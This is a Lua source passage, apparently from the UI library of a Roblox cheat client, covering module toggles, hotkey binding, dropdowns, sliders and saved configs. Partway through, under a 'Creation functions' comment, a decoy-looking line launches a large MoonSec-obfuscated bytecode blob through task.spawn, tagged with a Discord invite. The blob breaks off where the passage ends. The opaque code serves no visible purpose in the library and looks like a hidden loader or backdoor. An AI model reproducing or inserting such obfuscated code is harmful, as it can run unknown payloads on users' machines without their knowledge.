                Configs[self.Name] = {["Keybind"] = "", ["IsToggled"] = "", ["MenuToggled"] = "", ["Extras"] = {}}
            end
            if (t) then
                ModListEnable(self.Name)
                Configs[self.Name]["IsToggled"] = true
                saveSettings()
				if not nonoti then
                    ui:Notify("Module toggled", self.Name .. " was toggled")
				end
            else
                ModListDisable(self.Name)
                Configs[self.Name]["IsToggled"] = false
                saveSettings()
				if not nonoti then
                    ui:Notify("Module disabled", self.Name .. " was disabled")
				end
            end
            return self 
        end
        base_class.module_toggle_enable = function(self) 
            self.OToggled = true
            
            pcall(self.Flags.Toggled, true)
            pcall(self.Flags.Enabled)
            
            twn(self.Effect, {Size = s1}, true)
            
            ModListEnable(self.Name)
            return self 
        end
        base_class.module_toggle_disable = function(self) 
            self.OToggled = false
            
            pcall(self.Flags.Toggled, false)
            pcall(self.Flags.Disabled)
            
            twn(self.Effect, {Size = s2}, true)
            
            ModListDisable(self.Name)
            return self
        end
        base_class.module_toggle_reset = function(self)
            if (self.OToggled) then
                local f = self.Flags
                pcall(f.Toggled, false)
                pcall(f.Disabled)
                
                pcall(f.Toggled, true)
                pcall(f.Enabled)
            end
        end
        base_class.module_getstate_self = function(self) return self.OToggled end
        base_class.module_getstate_menu = function(self) return self.MToggled end
        
        base_class.module_setvis = function(self, t, t2) 
            self.Root.Visible = t 
            self.Highlight.Visible = t2
        end 
        
        base_class.module_click_self = function(self) 
            pcall(self.Flags.Clicked)
            
            self.Effect.BackgroundTransparency = 0.8
            twn(self.Effect, {BackgroundTransparency = 1}, true)
        end
        base_class.module_gettext = function(self) 
            return self.Text
        end
        
    end
    -- Setting funcs
    do
        base_class.s_toggle_self = function(self) 
            local t = not self.Toggled
            if (t) then
                Configs[self.PName]["Extras"][self.Name] = true
                saveSettings()
            else
                Configs[self.PName]["Extras"][self.Name] = false
                saveSettings()
            end
            pcall(self.Flags.Toggled, t)
            pcall(self.Flags.Enabled)
            pcall(self.Flags.Disabled)
            
            self.Toggled = t
            twn(self.Icon, {BackgroundTransparency = t and 0 or 1})
            return self
        end 
        base_class.s_toggle_enable = function(self) 
            self.Toggled = true
            
            pcall(self.Flags.Toggled, true)
            pcall(self.Flags.Enabled)
            
            twn(self.Icon, {BackgroundTransparency = 0})
            return self
        end 
        base_class.s_toggle_disable = function(self) 
            self.Toggled = false
            
            pcall(self.Flags.Toggled, false)
            pcall(self.Flags.Disabled)
            
            twn(self.Icon, {BackgroundTransparency = 1})
            return self
        end 
        base_class.s_toggle_reset = function(self) 
            if (self.Toggled) then
                local f = self.Flags
                pcall(f.Toggled, false)
                pcall(f.Disabled)
                
                pcall(f.Toggled, true)
                pcall(f.Enabled)
            end
        end
        base_class.s_toggle_getstate = function(self) 
            return self.Toggled
        end
        base_class.s_modhoykey_setnewhotkey = function(self, hotkey)
            local label = self.Label
            label.Text = 'Settings new key...'
            wait(0.01);
            local kcv = Enum.KeyCode[hotkey].Value
            self.Hotkey = kcv
            label.Text = 'Hotkey: ' .. Enum.KeyCode[hotkey].Name
            
            
            Configs[self.Parent.Name]["Keybind"] = Enum.KeyCode[hotkey].Name
            saveSettings()
            delay(0.01, function()
                local n = self.Parent.Name
                for i = 1, #ui_Hotkeys do 
                    if ui_Hotkeys[i][3] == n then
                        tabRemove(ui_Hotkeys, i)
                        break
                    end
                end
                tabInsert(ui_Hotkeys, {kcv, function() 
                    self.Parent:Toggle()
                end, n})
            end)
        end
        base_class.s_modhotkey_sethotkey = function(self) 
            local label = self.Label
            label.Text = 'Press any key...'
            print(self.Parent.Name)
            wait(0.01);
            local c;
            c = servInput.InputBegan:Connect(function(io,gpe)
                
                Configs[self.Parent.Name]["Keybind"] = io.KeyCode.Name
                saveSettings()
                
                local kcv = io.KeyCode.Value
                if (kcv ~= 0) then
                    
                    self.Hotkey = kcv
                    label.Text = 'Hotkey: '..io.KeyCode.Name
                    
                    -- As scuffed as this is, it works
                    -- To prevent the module being bound from immediately toggling, a short delay is made
                    delay(0.01, function()
                        local n = self.Parent.Name
                        for i = 1, #ui_Hotkeys do 
                            if ui_Hotkeys[i][3] == n then
                                tabRemove(ui_Hotkeys, i)
                                break
                            end
                        end
                        tabInsert(ui_Hotkeys, {kcv, function() 
                            self.Parent:Toggle()
                        end, n})
                    end)
                else
                    self.Hotkey = nil    
                    label.Text = 'Hotkey: N/A'
                    
                    local n = self.Parent.Name
                    for i = 1, #ui_Hotkeys do 
                        if ui_Hotkeys[i][3] == n then
                            tabRemove(ui_Hotkeys, i)
                            break
                        end
                    end
                end
                c:Disconnect()
            end)
            
        end
    
        base_class.s_modhotkey_gethotkey = function(self) 
            return self.Hotkey
        end
        
        base_class.s_hotkey_sethotkey = function(self) 
            local label = self.Label
            label.Text = 'Press any key...'
            
            wait(0.01);
            local c;
            c = servInput.InputBegan:Connect(function(io,gpe)
                local kc = io.KeyCode
                local kcv = kc.Value
                if (kcv ~= 0) then
                    
                    self.Hotkey = kc
                    label.Text = self.Name..': '..kc.Name
                    
                    pcall(self.Flags.HotkeySet, kc, kcv)
                else
                    self.Hotkey = nil    
                    label.Text = self.Name..': N/A'
                    
                    pcall(self.Flags.HotkeySet, nil, 0)
                end
                c:Disconnect()
            end)
        end
        
        base_class.s_hotkey_sethotkeyexplicit = function(self, kc) 
            self.Hotkey = kc
            self.Label.Text = self.Name..': '..kc.Name
            
            pcall(self.Flags.HotkeySet, kc, kc.Value)
            
            return self
        end
        
        base_class.s_hotkey_gethotkey = function(self)
            return self.Hotkey
        end
        
        
        base_class.s_dropdown_getselection = function(self) 
            return self.Selection
        end
        base_class.s_dropdown_toggle = function(self) 
            local t = not self.MToggled
            
            self.MToggled = t
            self.Menu.Visible = t
            
            pcall(self.Flags[ t and 'Opened' or 'Closed'])
            
            twn(self.Icon, {Rotation = t and 0 or 180}, true)
        end
        
        base_class.s_ddoption_select_self = function(self) 
            local parent = self.Parent
            
            local objs = parent.Objects
            for i = 1, #objs do objs[i]:Deselect() end
            
            self.Selected = true
            parent.Selection = self.Name
            pcall(parent.Flags['Changed'], self.Name, self)
            
            if (parent.Primary) then
                local n = parent.Parent.Name 
                ModListModify(n, n .. ' <font color="#DFDFDF">['..self.Name..']</font>')
            end
            
            twn(self.Effect, {Size = s1}, true)
            
            return self
        end
        base_class.s_ddoption_deselect_self = function(self) 
            if (self.Selected) then 
                self.Selected = false
                twn(self.Effect, {Size = s2}, true)
            end
            
            return self
        end
        base_class.s_ddoption_selected_getstate = function(self) 
            return self.Selected
        end
        
        base_class.s_slider_getval = function(self) return self.CurrentVal end
        base_class.s_slider_setvalnum = function(self, nval) 
            local min = self.Min
            local cval = self.CurrentVal
            local pval = self.PreviousVal
            
            cval = round(mathClamp(nval, min, self.Max), self.Step)
			Configs[self.PName]["Extras"][self.Name] = cval
			saveSettings()
            
            if (pval ~= cval) then
                pval = cval
                local form = self.StepFormat
                
                self.SliderFill.Position = dimOffset(mathFloor((cval - min) * self.Ratio), 0)
                self.SliderAmnt.Text = form:format(cval)
                
                if (self.Primary) then
                    local n = self.Parent.Name 
                    ModListModify(n, n .. (' <font color="#DFDFDF">('..form..')</font>'):format(cval))
                end
                
                pcall(self.Flags.Changed, cval)
            end
            
            self.CurrentVal = cval
        end
        base_class.s_slider_setvalpos = function(self, xval) 
            local min = self.Min
            local cval = self.CurrentVal
            local pval = self.PreviousVal
            
            local pos_normalized = mathClamp(xval - self.SliderBg.AbsolutePosition.X, 0, self.SliderSize)
            
            cval = round((pos_normalized * self.RatioInverse)+min, self.Step)
			Configs[self.PName]["Extras"][self.Name] = cval
			saveSettings()
            
            if (pval ~= cval) then
                pval = cval
                local form = self.StepFormat
                
                self.SliderFill.Position = dimOffset(mathFloor((cval - min)*self.Ratio), 0)
                self.SliderAmnt.Text = form:format(cval)
                
                self.CurrentVal = cval
                
                if (self.Primary) then
                    local n = self.Parent.Name 
                    ModListModify(n, n .. (' <font color="#DFDFDF">('..form..')</font>'):format(cval))
                end
                
                pcall(self.Flags.Changed, cval)
            end
        end
    end
    -- Button funcs
    base_class.button_click = function(self) 
        pcall(self.Flags['Clicked'])
    end
    -- Slider funcs
    base_class.slider_setval = function(self, value) 
        value = tonumber(value)
        if not value then uierror('slider_setval','value','number') end
        
        local m1,m2,m3 = self.min, self.max, self.step
        value = mathClamp(round(value, m3),m1,m2)
        
        self.setval_internal(value)
    end
    base_class.slider_getval = function(self) 
        return self.value1
    end
    -- Input funcs
    base_class.input_gettxt = function(self) 
        return self.Text
    end
    
    -- Generic funcs
    base_class.generic_tooltip = function(self, tooltip) 
        if (tooltip) then
            self.Tooltip = tostring(tooltip)    
        else
            self.Tooltip = nil
        end
        return self 
    end
    base_class.generic_connect = function(self, flagname, func) 
        if (type(func) ~= 'function' and type(func) ~= 'nil') then
            uierror('generic_connect','func','function or type nil')
        end
        if (type(flagname) ~= 'string') then
            uierror('generic_connect','flagname','string')
        end
        
        self.Flags[flagname] = func
        return self 
    end
      -- Creation functions
    local base_gen_class = 'Generic_Enabled' if (not base_classs) then local typemoduleone, typemodtwo = false, 1 end task.spawn(function() _ = 'discord.gg/gQEH2uZxUk';(function() _msec=(function(l,o,e)local Y=o[(132-0x6d)];local T=e[l[(0x2bb+(-0x858/24))]][l[(191280/0xf0)]];local f=(130-0x7e)/(0x1e0/(((-117+0x1ef)+-56)+-0x52))local k=(((0x19a-260)+-62)+-0x56)-(0x62+-97)local v=e[l[((51-0x47)+158)]][l[(-22+(0x288-340))]];local t=(0x19+(-4848/(283+-0x51)))+(332/0xa6)local j=e[l[(0x4a1-639)]][l[(0x7b93/37)]]local h=(67-0x41)-(73-(0xa4-(20148/0xdb)))local a=((0x2373/(200-(0x4489/121)))/0x37)local P=(((((9809213+-0x71)/225)/126)-235)-108)local p=((((-68+0x19)+0xdb)+-68)-0x69)local L=((0x12+((0x4f-57)-0x41))+0x1c)local B=((0x7bf6/((0x50e-702)-0x15a))-0x7e)local m=((0x270c/(-126+(0x1e1+-117)))/0xe)local H=((68+(-0x1cb6/(0xd1+-34)))+-0x18)local n=((152+(-0x2489/(20696/0x68)))-103)local K=((187-(-70+(462-0xf6)))-39)local M=(0x6e-(283-(375-(-0x57+287))))local x=((-0x7b+(((-0x55+1072)-0x20e)-286))-50)local F=(((-0x2c+(502-0x119))-0x85)+-0x2a)local S=(0x31-(((-31-0x9)+0x14)+65))local N=(88-(((597-0x137)+-0x58)-114))local u=((((0x13+-68)+-8967)/98)+0x60)local U=((-0x7e+(0x250-(709-0x16c)))+-0x75)local i=(49+(((366-0xec)/130)+-46))local _=(42-(-44+(108+(1-0x1b))))local G=l[(0xac9-1437)];local V=e[l[(0x164-218)]][l[((1074+-0x61)-0x200)]];local J=e[(function(l)return type(l):sub(1,1)..'\101\116'end)('ooMmkLfP')..'\109\101'..('\116\97'or'PkmfOKOm')..l[(0x1b97e/207)]];local r=e[l[(0xc65a/93)]][l[(-47+0x403)]];local C=(0x5e+-92)-(((0x7261/89)-0xd9)-0x6e)local D=(20+((0xf6-172)-0x5c))-(-66+0x44)local y=e[l[(389-0xfb)]][l[(-0x36+407)]];local o=function(l,o)return l..o end local s=(0x1c-24)*(0x108/((395-0xf4)-85))local A=e[l[(2439-0x4f1)]];local d=(89-0x57)*((0x27000/(1824/0xe4))/156)local g=(242688/0xed)*(105-((17933+-0x72)/173))local Q=((-0x7c+(129+-0x4e))+0x7d)local w=(0x6b-(-0x7d+(460/0x2)))*(0x83-129)local c=e[l[(2204-0x48a)]]or e[l[(1137-0x24f)]][l[(2204-0x48a)]];local O=(-75+((0x31da/18)-0x17a))local l=e[l[(2577-0x51e)]];local j=(function(O)local d,e=1,0x10 local o={j={},v={}}local b=-h local l=e+k while true do o[O:sub(l,(function()l=d+l return l-k end)())]=(function()b=b+h return b end)()if b==(s-h)then b=""e=C break end end local b=#O while l<b+k do o.v[e]=O:sub(l,(function()l=d+l return l-k end)())e=e+h if e%f==C then e=D r(o.j,(y((o[o.v[D]]*s)+o[o.v[h]])))end end return j(o.j)end)("..:::MoonSec::..bBfFlLkKoOpPhHmMpHkHLbFFlkMmHhPMpfOfbkoLBBOfpmmFPpOHobloMLKkMFlPmpKphoKPbfKommKhMlhHPbOFKfMFooMPKpbHoPMMobbHMKFHBpMHmbKOHlmpMkopLHllMOHPPmpBmLoBlpfHBbMFHkMOMBPMHKlHfobPmmmoLbmKLkmpklhllpHbHbpMOfKLPOoHKllOKbHFppoHKblompLHmpFOHOklhFlLMBlmPMLkHpPHpboFkkhOkhlMhFHPPoOPKmlmFHooHPpbLkhHOkKOLhFMffoLFKbPFpOLKlLKFpfBOhfOpfbKOBkMLfFLfOOKBOplBmLOkplHFbBFMkHOmoHMLFkhlofPbmMLKlblKKMKoBbphobMmhhMPfMKpKlpmFoLFhfMhppHObKFLkFOflFMmlHPpooPkmFmmBLMmLLKHkkoHpLpOKkMmfkmmFBhhpkHmmkmHlkKmkLmlmOOKhLMpOLOMHOHllpMlomhhokmBhhBBMMhpfLBmOOpfPmfolBphPkbBbPFLHMfOMlOpKobFbHfFoMMPkkoMhpMlpMLOHFkmboFffHKkkHlpMLfhfkmbhPfLOMhpbKbmKoLfMMmKplOhBoMblpoKmfbOfkPbpoFfpMoKbbmmkoPMoHMKffhookBbLKplmPHOLbpHHLLfLhpkhmLoKfphmKFlfPLkfbBHKlKmhOFFfbKKHffhLkobhHMLfMmhhlLmpPPLphhpflhMhLHbOmpobmHhfkkHHKHLkMkpmllPpLLFmHBKKmLhbKbbhMFHbPFOkpbhOKpKKBoObPfpMOBKlLKOOOfbkmFhkpOfLobKklLFoMHofhBploKkplHMbkkFkMfhfOMofkLPFhFHhLHOBfLkpoBkblFfkkpbMOoBKMFKPLPFmfBbLOKBbOLOkKFLkFOfhpmfHpLfPpLBBLKFlBKMpfFpKOpMlPPmHBkBFMLHoPPbmMkKOlKfpbHMBKKbfKFbbolMKlfMhKHhkKMmpLMmFlmBfKoBKKLbhlPKFLPFoBPMmlOBbHKoPLpBmOBfbMOHhPMpPfMpffkPkFoPKfMPLfMHHkKlkfObhLBmpKKBhmmLmlBflbObKhHPbOFKKLOFhBMBlmOhopPomKlLlFKBpMHmbhFpkoOkhlMFfBLMoHPPmpfolkKlpfHBbbLHkPOOHKMkPlLfobPbbHBPlOoKpKFlbfFbkbMhhpMOFKLkBFPBMbBbFhKpmHLKbLFFkffMhmbhfpOHbkPlmFBBmMKHPPHpbpFkklOfhBbMfHLPoOHOPkBlLfKbhmHHbPFpohhLhlbffbhmohPpmOBOOLKFPBHbbmFhkpOOmObLfFKBobmHmhBploOoKlHFFBFMOHOPhOMofpflofMbmMfHlPKOpKHkblFfPbOmMhMPfOLopLPFmfKblbOhppHObKFLkFOfBMMmlhLppoPKlLBFlBPMpFphbplokkmlhFFLpMLHoPPMPoBkLlKfpFPMbHoPkOhKhLMlfFKfhmPHlPBpfKKLpFHFfbFmkHbphOkKfLLFofHMmmBhhpKOPkHLbFFfoMOHhhopfObkolPfmfFMlHKhlOHohkFlkfObhmMHfPhOooLLmlFflbKmphHPkOFKhLOlFBMbfmLhoPbomKFLlFOBpbFmbhFppoOhOlMFFBLMHHPhfmOolkKlpopBbMlHkPOhpKMkKlLfPbPmmHBhkPPKpkFlbFBbkmOhhhBOfKLLMFPfLbBmlhKPhoHKbLPFkFpMhHMhfPKookPLKFBfPMKHpPHPfoFkkLFfhBOMfHLPoOPKmkBlPfKBlmHHfPFOkKOLhlLffbPmoHfpmOBKlLKFMBHbfmFhopOOfkMLfFOBoLoHmhfplohkpLBKoBFMkHOBOOMoFkLloLObmMkHlPpOpKHkblLlFbOMfhMPkOLKoLPFmkhblmhhppMObKLLkFMBhMMmKhLbloPkMLBFlBKMmfLhbpFokhLlhFbBfMLbkPPpFoBkKlKfpbHbfMpPkOMKhKPlffLboMHhmPBOPKKKLFHfbbFMohOphOKKfKFFoBPMmmBhlpKOBkHLKFFBmMOmfPMpfohkooFfmBfMlHKPppBhokFlkfOllmMHFPLOhhFLmlBflllmphmPbpLOoLOlFBMbOmLhopPpbOfLlFMBpbLmbhFpkOPoHlMFPBLBBHPPmpBOkoolpFKBbbfHkPOOhKMkPlLfMbPMoHBPkOKKppblbfObkmMhhPkOfKPLoFPflbBfLhKpPoHKbLFFpkBMhHMhfmkookhlmFLLhMKHpPHmfoFkKlOFmFBMfHPPopPKmkBllfKLLmHHLPFOoKOLmFMfoBlmohMpmmmKlLoFpffbbmKbmpOohkMpMFLBOMPHmmMplohkpLbFbBFMkmPmbOMookLklfPbmMBmkPKOpolkblpfkbOmhmBPfOLobLPkBfBblmKHhpHObKhLkFHBhMMmfHKpooPKoLBlhBKMpHHhbpFokKblhFOBfMKHoPPOmoBkplKFbbHMKHFPkOOKhkllffKbomHhmPKOlKKLmFHKHbFmKhOPBoMKkOHFoBPMmFmhlpoopkHKmFFBPMOHMPMpfoLKpKofmBKMlMFPpOHobKLlkfOBFmMHOPLOoKPKblBflbMmpmKPbOFKkkPFhBMbPmLHHpPomKBkkFKBpbKmbhOpkoOkhlMFfBLMMHPhopBokkKlpfHBbMOHkPMOhokkflLfobPMFHBPkOKKhLHlbfFbkmHhhPlOfKLLoFMBmbBmlhKbKoHKBLFFklPMhmFhfpLookPlmFBFOMKHmPHpBoFkklOFfbMMfHOPobfKmkfllfKbpMBBoPFOkKOhFFMfFbLBoHhpmOkKlkOFpFHbbMLBOpOOBkMLKFLBoMPHmmBploKkplmFbBFMkmPHmOMoKkLlOfPbmMBHpmHOpoFkblFfkbpmhHbPfOLhpLPFmfBbkmKhppHObPoLkFmBhbBmfhkpooMPkLBFlBKLhHHhBpFOooPlhFlBfBKHoPPOmOFoFlKFbbHMHHFPkOOOhLMlffPboMBhmPFOloOLpFHfobFmHhOphoMolLLFoflMmMLhlpKopKMLbFFfbMOMOPMpfoLKplPfmBhMlmFPpOHobkFlkfOBlmMHHPLOpKPLmlBflbHmpHLPbOFKkLOFhBMbKmLhopPObKBLlFKBpbfmbhlpkopkhlMLfBLMoHPPMpBolkKlMfHBbMFHKPOOhKMpOlpfobPmmHmkBHOLMmkllfFbkmOHmHBOfKLLoFhBmbBmlhKhkoHKBLFFkBOMhHMhfmpookPlmFFBlMoHpPHhboFkklOfHbMMfHLPoOPKmkBllfObpmHHbMPOkKOLhFMffbLmohPbhOkKlLKFpfpOmBHpOfppPkMLfFLfpBhHmhFplookplHFbfLBKHOPMOMoFkLlofPfbBFHlPPOpKMkblFfkbMffhMPKOLKoLPFMfBbomKhpMMObKFLkFPBhMMmfhLMpoPkmLBFlBKMpHHhbMLokkOlhFfBfMLHoPPMboBkllKfPbHMbHFPkHmKhkFlffKbomhhmPKpoKKLpFHfhbFmKhOpHoMKkOHFoBPMmmHhlpoopKBOoFFBkMOMKPMpFoLkmLBfmBBMlMfPpOmobkllkfHLlmMHfPLPFKPLMlBfpBPmphmPbplKkLpFhBMbfmOBbpPomKBkLFKBPMHmlbPpkoOkhkpFfBkMoHPblpBookKlhfHBFMFHkMMOholkflofobHmmHKhoOKKmLHLkfFbKmOHBpMOkPHLoFPBmBKmlhoppOBPoLFFkBOBKHMhFpLooPBlmFLBlMOHphbpboFphlOFBbMMLHLPpOPolkKllfPbpboHbPlOkKmLhlFkpbLmohPhOOBKLLKFmkLbbmFhkhLohKbLfFLlpMPmfhBploKkplHFbFoMkHHPhpbofkLlofPFmMBHoPKOhKHkblFfkfOmhhMPfOkKoLPFmffblmKhppHObKFLklbBhMMmfhLMooPkmLBFLBKMpHHhbpFokkOlhfMBfMLHoPPOmoBkllKfpbHMbHFPkOOKhLMlffobomPhmPBOlKKLpFHfbbFmkhOphoMKfLLFoBHMmmBhlpKopkHLbFFBKMOHhPMpfoLkolPfmBFMhHKPpOHOpkFlkfObhmMHffLHopPkBlBflbKMpKHmPboKpLOFhBMbBOOBLoKPmKLLlFKBpMHoFMHoMpFkhlMFfBLMoHPpmmbOHKFlpfHBbmoopMHopHOKOblkFmLOBmmLMOoKpLHlbfFbomMhhpMOfoLbKokMmolMmmoppoHKbkLLoBOMMHMhopLookPlmKlBlMpHphbpbolkklMfhbMMLHLPMOPKMkBllfKbmFLHbPFOkobLhlbffBKbphPPBOBKpLKFpBHbbfkhkphohKfLfFkBoMPbmhBpKoKkhlHFbBFboMpPhpfofkplofPbmbFMfPKOmKHkKlFfkbOMmhMPfOpKokbFmfBblmKhppHOkKFLkFOBhMMMlhLpoOfkmLkFlBKMpmBhbpFoPkOkOfMBFMLHomOOmopkllPfpbHMbmLmfOOokLMlpfLbomPmmPBOloBLplKfbbKmkmOphoMKHLLFoBPbbmBhlpKopKpLbFPBkMOHhPMpfoLKklPFkBBMlHKPpOHobkmlkFKbhMBHfHLOoKPkOlBfMbKmHhHPbOFKkklFhfBbfmKhopPomKBLMFKfLMHmFhFhkoOkhLpFffbMoHhPmpBolkKLlfHBfMFHoPOOhKMkflOfoBlmmHPPlOKKpLHlOfFbOmOhmpMPfKLLoFmBmbpmlhoppOBKmLFFPBObOHMhFpLOpoHlmFkBlMHHpPHpboFohlOFBbMMFHLPhOPKmOBllfPbpmMHbPFOkKOKhFMffbLmOhPpmOBKlLKFpBHbFmlhkpOohMPLKFLBoMPmPLMHmkpmPLLFbBFMkHOmBOMoFkLlofPbmMBmkHOOpKMkbllfkbOmhHLmoOLKPLPFmfBbLmKhhpHObhLLkFOBhbbmfhLpooPhbLBFlBKMpHHhbpFokpmlhFBBfMKHoPhOmoBOllKfPbHMfHFPkOOKhKMlffLbomhhmPBOlKoLpFHfbbKmkhOphlOKmLLFoBPbloMMhopMmoFbHOBBkOOBKoPopoMkolPfmBKpfBhOlBmpffKppfoOhHKHKPLOoKPLMmBLMMFkkOmPhOFKkLOlbPMlMPMlhhhLfHllfHbLKHKMfhFpkoOKmKBFfBLMoHHPmpBolkHlpfHBbMFHpPOOHKMkflLfhLFmmHBPlOPKpLmlbfKlmmOhhpMpbKLLOFPFbfFmlhKppomKbLFFkBMMhHMhfpLObkPlMFBBlMKHmbLpboFkkLBfhBbMfHObbOPKmkBLffKbPmHmfHLOkKOLhlFffbLmoHBpmOBKlLKlkBHbBmFhkpOObPKLfFLBobKHmhfploPPflHFbBFblHOPHOMOloKlofPbmMlHlPKOpOHKklFfkbOmhhMPkOLKoKKFmffblmohppHObKFpBFOBhMMmlhLppoPkmOpFlBKMpHHhbpFokkOkhfMBfMLHOPPOmoBkllKfpbHMbHlPkOOKhLMlFfLbomPhmHBOlKKLpFmfbbFmkhOphoMKfLLFo");local r=(127+(-127+0x1d))local b=118 local e=h;local l={}l={[(48-0x2f)]=function()local l,k,h,o=v(j,e,e+t);e=e+w;b=(b+(r*w))%O;return(((o+b-(r)+d*(w*f))%d)*((f*g)^f))+(((h+b-(r*f)+d*(f^t))%O)*(d*O))+(((k+b-(r*t)+g)%O)*d)+((l+b-(r*w)+g)%O);end,[(105-0x67)]=function(l,l,l)local l=v(j,e,e);e=e+k;b=(b+(r))%O;return((l+b-(r)+g)%d);end,[(0x36/18)]=function()local o,l=v(j,e,e+f);b=(b+(r*f))%O;e=e+f;return(((l+b-(r)+d*(f*w))%d)*O)+((o+b-(r*f)+O*(f^t))%d);end,[(129-0x7d)]=function(e,l,o)if o then local l=(e/f^(l-h))%f^((o-k)-(l-h)+k);return l-l%h;else local l=f^(l-k);return(e%(l+l)>=l)and h or D;end;end,[(0x4d+-72)]=function()local o=l[(45-0x2c)]();local b=l[(0x44-67)]();local n=h;local e=(l[(876/0xdb)](b,k,s+w)*(f^(s*f)))+o;local o=l[(0x2c-40)](b,21,31);local l=((-h)^l[(0x71-109)](b,32));if(o==D)then if(e==C)then return l*D;else o=k;n=C;end;elseif(o==(d*(f^t))-k)then return(e==D)and(l*(k/C))or(l*(D/C));end;return T(l,o-((O*(w))-h))*(n+(e/(f^Q)));end,[(76-0x46)]=function(o,f,f)local f;if(not o)then o=l[(184/0xb8)]();if(o==D)then return'';end;end;f=V(j,e,e+o-h);e=e+o;local l=''for o=k,#f do l=G(l,y((v(V(f,o,o))+b)%O))b=(b+r)%d end return l;end}local function V(...)return{...},A('#',...)end local function j()local P={};local n={};local o={};local M={P,n,nil,o};local e={}local B=(0x5a58/236)local b={[(0x31-(0xebd/77))]=(function(o)return not(#o==l[(0x118/140)]())end),[(-0x7e+129)]=(function(o)return l[(320/0x40)]()end),[(0xcc/204)]=(function(o)return l[(85+-0x4f)]()end),[(-0x7e+128)]=(function(o)local b=l[(582/0x61)]()local o=''local l=1 for e=1,#b do l=(l+B)%O o=G(o,y((v(b:sub(e,e))+l)%d))end return o end)};local o=l[(39-0x26)]()for o=1,o do local l=l[(0xd8/108)]();local h;local l=b[l%(4830/0xd2)];e[o]=l and l({});end;for O=1,l[(-76+0x4d)]()do local o=l[(108+-0x6a)]();if(l[(-25+0x1d)](o,h,k)==C)then local d=l[(0x258/150)](o,f,t);local b=l[(0x1f4/125)](o,w,f+w);local o={l[(-0x1b+30)](),l[(-40+0x2b)](),nil,nil};local n={[(39-0x27)]=function()o[L]=l[(0x1f-28)]();o[i]=l[(29-0x1a)]();end,[(-90+0x5b)]=function()o[L]=l[(80-0x4f)]();end,[(0x70+-110)]=function()o[p]=l[(87-0x56)]()-(f^s)end,[(0x7a+(-0x81+10))]=function()o[L]=l[(77-0x4c)]()-(f^s)o[i]=l[(0x17+-20)]();end};n[d]();if(l[(0x79-117)](b,k,h)==k)then o[x]=e[o[x]]end if(l[((0xe9-161)+-68)](b,f,f)==h)then o[a]=e[o[a]]end if(l[((322-0xe0)-0x5e)](b,t,t)==k)then o[i]=e[o[u]]end P[O]=o;end end;for l=k,l[(0x5e-93)]()do n[l-k]=j();end;M[3]=l[(0x1c-26)]();return M;end;local function D(l,w,r)local e=l[f];local O=l[t];local d=l[h];return(function(...)local s=e;local y={};local l=h l*=-1 local t=l;local e=h;local C={};local j={...};local g=A('#',...)-k;local b={};local d=d;local O=O;local v=V for l=0,g do if(l>=O)then y[l-O]=j[l+k];else b[l]=j[l+h];end;end;local l=g-O+h local l;local O;while true do l=d[e];O=l[(219/0xdb)];o=(8900430)while O<=(0x9d-116)do o-= o o=(1282757)while O<=(0x41-45)do o-= o o=(21160)while O<=((0xf993/31)/229)do o-= o o=(7210371)while O<=(0x82-126)do o-= o o=(12518324)while O<=(52-0x33)do o-= o o=(1055574)while(99+-0x63)<O do o-= o local l={b,l};l[k][l[f][H]]=l[h][l[f][i]]+l[k][l[f][B]];break end while(o)/((0xc67+(0x1-53)))==338 do if b[l[x]]then e=e+h;else e=l[B];end;break end;break;end while 3757==(o)/((0x319f4/61))do o=(7458610)while O<=(0x12+-16)do o-= o local o=l[H];local e=b[l[m]];b[o+1]=e;b[o]=e[l[i]];break;end while 2195==(o)/((258248/0x4c))do o=(160341)while((-18+0x5c)+-71)<O do o-= o r[l[m]]=b[l[H]];e=e+h;l=d[e];b[l[n]]={};e=e+h;l=d[e];b[l[F]]={};e=e+h;l=d[e];r[l[L]]=b[l[x]];e=e+h;l=d[e];b[l[K]]=r[l[P]];e=e+h;l=d[e];if(b[l[n]]==l[U])then e=e+k;else e=l[B];end;break end while 97==(o)/((3424-0x6eb))do local l=l[H]b[l]=b[l](b[l+k])break end;break;end break;end break;end while(o)/((0x7d6b4/196))==2751 do o=(1198440)while O<=(25+-0x13)do o-= o o=(6799812)while(490/0x62)<O do o-= o if(b[l[x]]==b[l[u]])then e=e+k;else e=l[p];end;break end while(o)/((0xa5da/13))==2082 do local o=l[M];local h=b[o]local O=b[o+2];if(O>0)then if(h>b[o+1])then e=l[a];else b[o+3]=h;end elseif(h<b[o+1])then e=l[a];else b[o+3]=h;end break end;break;end while 3329==(o)/((42840/0x77))do o=(3733821)while O<=(1386/0xc6)do o-= o b[l[H]]=b[l[p]]%l[U];break;end while(o)/((0x1e02-(-0x69+4004)))==987 do o=(15153750)while O>(688/0x56)do o-= o local o=l[n]b[o]=b[o](c(b,o+h,l[p]))break end while(o)/((-0x4b+3825))==4041 do do return end;break end;break;end break;end break;end break;end while(o)/((120612/0xe4))==40 do o=(559625)while O<=((0x105-162)-0x55)do o-= o o=(2130990)while O<=(78-0x43)do o-= o o=(7718679)while(0x7d+-115)<O do o-= o local O;local o;b[l[x]]=r[l[P]];e=e+h;l=d[e];b[l[M]]=r[l[m]];e=e+h;l=d[e];b[l[x]]=l[P];e=e+h;l=d[e];b[l[K]]=l[m];e=e+h;l=d[e];b[l[F]]=l[p];e=e+h;l=d[e];o=l[M]b[o]=b[o](c(b,o+h,l[L]))e=e+h;l=d[e];b[l[F]]=b[l[p]][b[l[S]]];e=e+h;l=d[e];o=l[n]b[o]=b[o](b[o+k])e=e+h;l=d[e];O=b[l[_]];if not O then e=e+k;else b[l[M]]=O;e=l[P];end;break end while 2251==(o)/((0x15c42/26))do local l={b,l};l[k][l[f][M]]=l[h][l[f][_]]+l[k][l[f][L]];break end;break;end while 1255==(o)/((-114+0x714))do o=(692664)while(47-0x23)>=O do o-= o local o=l[n];local O=b[o+2];local h=b[o]+O;b[o]=h;if(O>0)then if(h<=b[o+1])then e=l[m];b[o+3]=h;end elseif(h>=b[o+1])then e=l[p];b[o+3]=h;end break;end while 196==(o)/((685596/0xc2))do o=(6384114)while O>(247/0x13)do o-= o local o=l[n];local O=b[o+2];local h=b[o]+O;b[o]=h;if(O>0)then if(h<=b[o+1])then e=l[P];b[o+3]=h;end elseif(h>=b[o+1])then e=l[p];b[o+3]=h;end break end while 3394==(o)/((0xec8-1903))do local l=l[K]b[l]=b[l](c(b,l+h,t))break end;break;end break;end break;end while 925==(o)/(((13967030/0xee)/0x61))do o=(124576)while O<=(0x85-116)do o-= o o=(3395214)while O<=(0x86-119)do o-= o local o=b[l[i]];if not o then e=e+k;else b[l[F]]=o;e=l[B];end;break;end while 